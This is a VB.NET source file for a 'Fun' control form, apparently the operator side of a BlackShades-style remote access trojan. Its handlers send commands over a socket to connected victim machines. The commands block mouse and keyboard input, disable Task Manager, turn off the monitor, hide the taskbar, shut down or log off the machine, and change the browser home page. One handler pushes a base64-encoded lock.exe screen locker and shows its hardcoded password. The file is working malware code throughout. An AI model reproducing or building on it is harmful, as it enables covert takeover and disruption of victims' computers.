Imports System.Runtime.InteropServices

Public Class Fun
    Public sock As Integer
    Public f As Form1
    Public ReadOnly Property title
        Get
            Return TextBox6.Text
        End Get
    End Property
    Public ReadOnly Property message
        Get
            Return TextBox5.Text
        End Get
    End Property
    Public ReadOnly Property messageicon
        Get
            If RadioButton1.Checked Then
                Return "1"
            ElseIf RadioButton2.Checked Then
                Return "2"
            ElseIf RadioButton3.Checked Then
                Return "3"
            ElseIf RadioButton4.Checked Then
                Return "4"
            Else
                Return "1"
            End If
        End Get
    End Property
    Public ReadOnly Property messagebutton
        Get
            If RadioButton5.Checked Then
                Return "1"
            ElseIf RadioButton6.Checked Then
                Return "2"
            ElseIf RadioButton7.Checked Then
                Return "3"
            ElseIf RadioButton8.Checked Then
                Return "4"
            ElseIf RadioButton9.Checked Then
                Return "5"
            ElseIf RadioButton10.Checked Then
                Return "6"
            Else
                Return "1"
            End If
        End Get
    End Property

    <DllImport("KERNEL32.DLL")> _
    Public Shared Sub Beep(ByVal freq As Integer, ByVal dur As Integer)
    End Sub
    Private Sub Button45_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button45.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 623)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(623, 300)
    End Sub

    Private Sub Button46_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button46.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 593)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(593, 300)
    End Sub

    Private Sub Button47_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button47.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 540)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(540, 300)
    End Sub

    Private Sub Button48_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button48.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 491)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(491, 300)
    End Sub

    Private Sub Button49_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button49.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 449)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(449, 300)
    End Sub

    Private Sub Button50_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button50.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 429)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(429, 300)
    End Sub

    Private Sub Button51_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button51.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 393)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(393, 300)
    End Sub

    Private Sub Button52_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button52.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 361)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(361, 300)
    End Sub

    Private Sub Button40_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button40.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 466)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(466, 300)
    End Sub

    Private Sub Button41_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button41.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 415)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(415, 300)
    End Sub

    Private Sub Button42_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button42.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 369)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(369, 300)
    End Sub

    Private Sub Button43_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button43.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 311)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(311, 300)
    End Sub

    Private Sub Button44_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button44.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 277)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(277, 300)
    End Sub

    Private Sub Button35_Click(sender As System.Object, e As System.EventArgs) Handles Button35.Click
        Form1.s.Send(sock, "BepX" & Form1.yy & TextBox2.Text & Form1.yy & TextBox3.Text)
    End Sub


    Private Sub Button39_Click(sender As System.Object, e As System.EventArgs) Handles Button39.Click
        Form1.s.Send(sock, "ErorrMsg" & Form1.yy & messageicon & Form1.yy & messagebutton & Form1.yy & title & Form1.yy & message)
    End Sub

    Private Sub Button38_Click(sender As System.Object, e As System.EventArgs) Handles Button38.Click
        Dim x As MessageBoxIcon
        Dim y As MessageBoxButtons

        If RadioButton1.Checked = True Then
            x = MessageBoxIcon.Information
        ElseIf RadioButton2.Checked Then
            x = MessageBoxIcon.Question
        ElseIf RadioButton3.Checked Then
            x = MessageBoxIcon.Warning
        ElseIf RadioButton4.Checked Then
            x = MessageBoxIcon.Error
        Else
            x = MessageBoxIcon.Asterisk
        End If
        '#################################################################"
        If RadioButton5.Checked Then
            y = MessageBoxButtons.YesNo

        ElseIf RadioButton6.Checked Then
            y = MessageBoxButtons.YesNoCancel
        ElseIf RadioButton7.Checked Then
            y = MessageBoxButtons.OK
        ElseIf RadioButton8.Checked Then
            y = MessageBoxButtons.OKCancel
        ElseIf RadioButton9.Checked Then
            y = MessageBoxButtons.RetryCancel

        ElseIf RadioButton10.Checked Then
            y = MessageBoxButtons.AbortRetryIgnore
        Else
            y = MessageBoxButtons.OK
        End If
        MessageBox.Show(TextBox5.Text, TextBox6.Text, y, x)
    End Sub

    Private Sub BlackShadesNetButton16_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton16.Click
        f.s.Send(sock, "blockmouseandkeyboard")
    End Sub

    Private Sub BlackShadesNetButton18_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton18.Click
        f.s.Send(sock, "blockmouseandkeyboard")
    End Sub

    Private Sub BlackShadesNetButton19_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton19.Click
        f.s.Send(sock, "unblockmouseandkeyboard")
    End Sub

    Private Sub BlackShadesNetButton17_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton17.Click
        f.s.Send(sock, "unblockmouseandkeyboard")
    End Sub



    Private Sub BlackShadesNetButton2_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton2.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "TurnOffMonitor") ' ask server to turn off monitor
        Next
    End Sub

    Private Sub BlackShadesNetButton1_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton1.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "TurnOnMonitor") ' ask server to turn on monitor
        Next
    End Sub








    Private Sub BlackShadesNetButton3_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton3.Click

        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "volup")
        Next
    End Sub

    Private Sub BlackShadesNetButton4_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton4.Click

        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "voldn")
        Next
    End Sub

    Private Sub BlackShadesNetButton5_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton5.Click

        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "mute")
        Next
    End Sub

    Private Sub BlackShadesNetButton6_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton6.Click
        f.s.Send(sock, "s")
    End Sub

    Private Sub BlackShadesNetButton7_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton7.Click
        f.s.Send(sock, "s1")
    End Sub

    Private Sub BlackShadesNetButton8_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton8.Click
        Form1.s.Send(sock, "TaskbarHide")
    End Sub

    Private Sub BlackShadesNetButton9_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton9.Click
        Form1.s.Send(sock, "TaskbarShow")
    End Sub

    Private Sub BlackShadesNetButton10_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton10.Click
        Form1.s.Send(sock, "ClockOFF")
    End Sub

    Private Sub BlackShadesNetButton11_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton11.Click
        Form1.s.Send(sock, "ClockON")
    End Sub

    Private Sub BlackShadesNetButton12_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton12.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "DisableTaskManager") ' ask server to disable task manager
        Next
    End Sub

    Private Sub BlackShadesNetButton13_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton13.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "EnableTaskManager") ' ask server to enable task manager 
        Next
    End Sub

    Private Sub BlackShadesNetButton25_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton25.Click

        Dim n As New IO.FileInfo(Application.StartupPath & "\" & "lock.exe")

        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "lock" & "||" & n.Name & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\" & "lock.exe")))
        Next

        MsgBox("Screen Password is :gfpt3t7w7g")
    End Sub

    Private Sub BlackShadesNetButton14_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton14.Click
        f.s.Send(sock, "ReverseMouse")
    End Sub

    Private Sub BlackShadesNetButton15_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton15.Click
        f.s.Send(sock, "NormalMouse")
    End Sub

    Private Sub BlackShadesNetButton20_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton20.Click
        f.s.Send(sock, "opencd")
    End Sub

    Private Sub BlackShadesNetButton21_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton21.Click
        f.s.Send(sock, "closecd")
    End Sub

    Private Sub BlackShadesNetButton22_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton22.Click
        f.s.Send(sock, "logoff")
    End Sub

    Private Sub BlackShadesNetButton23_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton23.Click
        f.s.Send(sock, "shutdowncomputer")
    End Sub

    Private Sub BlackShadesNetButton24_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton24.Click
        f.s.Send(sock, "restartcomputer")
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Form1.s.Send(sock, "IEhome" & Form1.yy & TextBox1.Text)
    End Sub
End Class